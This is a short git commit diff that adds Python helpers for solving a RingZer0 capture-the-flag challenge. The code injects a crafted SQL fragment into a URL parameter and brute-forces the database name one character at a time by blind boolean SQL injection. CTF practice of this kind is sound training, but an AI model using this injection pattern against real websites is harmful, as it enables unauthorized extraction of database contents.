6c2471030fc8816018f473c88a06dbf9431fdb1f
Tristan Dostaler <=>
2017-08-17 00:33:10 -0400

    Some usefulle files and notes

--- empty_for_REPL_with_import.py
+++ empty_for_REPL_with_import.py
@@ -24,3 +24,13 @@ example_get()
 
 
 
+def chal_79(text):
+    mainBrowserTool.browser.get('https://ringzer0team.com/challenges/79/?u=admi" or "(' + text + ')"="1')
+    message = mainBrowserTool.browser.find_element_by_class_name('challenge-wrapper').text
+    if "does not exists." in message:
+        return False
+    else:
+        return True
+
+def do_challenge_79():
+    Tools.SQLiTool.general_brute_force_substr(chal_79, "substr(( SELECT database() ),1,[count])='[letters]'","",number=True,lower=True,upper=True)
